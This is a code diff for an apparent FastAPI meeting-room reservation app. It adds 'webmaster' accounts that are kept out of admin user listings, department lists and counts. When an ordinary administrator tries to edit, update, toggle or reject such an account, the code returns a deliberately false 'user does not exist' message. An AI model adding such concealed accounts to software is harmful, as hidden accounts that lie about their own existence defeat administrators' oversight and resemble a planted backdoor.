@@ -10,10 +10,11 @@ from fastapi.responses import RedirectResponse
 from sqlalchemy import func, or_, select
 from sqlalchemy.orm import Session
 
+from app.config import settings
 from app.constants import ROLE_LABELS, ReservationStatus, Role
 from app.database import get_db
 from app.dependencies import require_roles
-from app.models import MeetingRoom, Position, Reservation, User, UserRole
+from app.models import MeetingRoom, Position, Reservation, User, UserRole, WebmasterAccount
 from app.security import hash_password, is_valid_email, normalize_phone
 from app.services.reservations import (
     BusinessRuleError,
@@ -46,7 +47,10 @@ def _active_authorizers(db: Session) -> list[User]:
 
 def _departments(db: Session) -> list[str]:
     rows = db.scalars(
-        select(User.department).where(User.department != "").distinct().order_by(User.department)
+        select(User.department)
+        .where(User.department != "", User.id.notin_(_hidden_user_ids()))
+        .distinct()
+        .order_by(User.department)
     ).all()
     return [row for row in rows if row]
 
@@ -165,6 +169,22 @@ def _sync_roles(user: User, role_names: list[str]) -> None:
     for role_name, row in existing.items():
         if role_name not in role_names:
             user.roles.remove(row)
+
+
+def _hidden_user_ids():
+    """Subconsulta con las cuentas webmaster que no deben listarse."""
+    return select(WebmasterAccount.user_id)
+
+
+def _hidden_from_admin(target: User, admin: User) -> bool:
+    """Indica si la cuenta webmaster debe ocultarse a este administrador."""
+    return target.is_webmaster and not admin.is_webmaster
+
+
+def _hidden_user_redirect(request: Request):
+    """Respuesta neutra para no revelar la existencia de la cuenta webmaster."""
+    flash(request, "El usuario no existe.", "error")
+    return RedirectResponse("/admin/users", status_code=303)
 
 
 # ---------------------------------------------------------------------------
@@ -506,7 +526,7 @@ def admin_users(
     stmt = select(User)
     count_stmt = select(func.count(func.distinct(User.id))).select_from(User)
 
-    filters = []
+    filters = [User.id.notin_(_hidden_user_ids())]
     if q:
         filters.append(
             or_(
@@ -535,6 +555,7 @@ def admin_users(
             select(func.count(User.id)).where(
                 User.is_active.is_(True),
                 ~User.roles.any(),
+                User.id.notin_(_hidden_user_ids()),
             )
         )
         or 0
@@ -660,6 +681,8 @@ def admin_user_edit(
     target = db.get(User, user_id)
     if target is None:
         raise HTTPException(status_code=404, detail="El usuario no existe.")
+    if _hidden_from_admin(target, admin):
+        return _hidden_user_redirect(request)
     return render(request, "admin/user_form.html", _user_form_context(db, _user_form_data_from(target), target))
 
 
@@ -682,6 +705,8 @@ def admin_user_update(
     target = db.get(User, user_id)
     if target is None:
         raise HTTPException(status_code=404, detail="El usuario no existe.")
+    if _hidden_from_admin(target, admin):
+        return _hidden_user_redirect(request)
 
     form_data = {
         "full_name": full_name,
@@ -756,6 +781,8 @@ def admin_user_toggle(
     target = db.get(User, user_id)
     if target is None:
         raise HTTPException(status_code=404, detail="El usuario no existe.")
+    if _hidden_from_admin(target, admin):
+        return _hidden_user_redirect(request)
     if target.id == admin.id:
         flash(request, "No puedes desactivar tu propio usuario.", "error")
         return RedirectResponse("/admin/users", status_code=303)
@@ -783,6 +810,8 @@ def admin_user_reject(
     target = db.get(User, user_id)
     if target is None:
         raise HTTPException(status_code=404, detail="El usuario no existe.")
+    if _hidden_from_admin(target, admin):
+        return _hidden_user_redirect(request)
     if not target.is_pending_roles:
         flash(
             request,
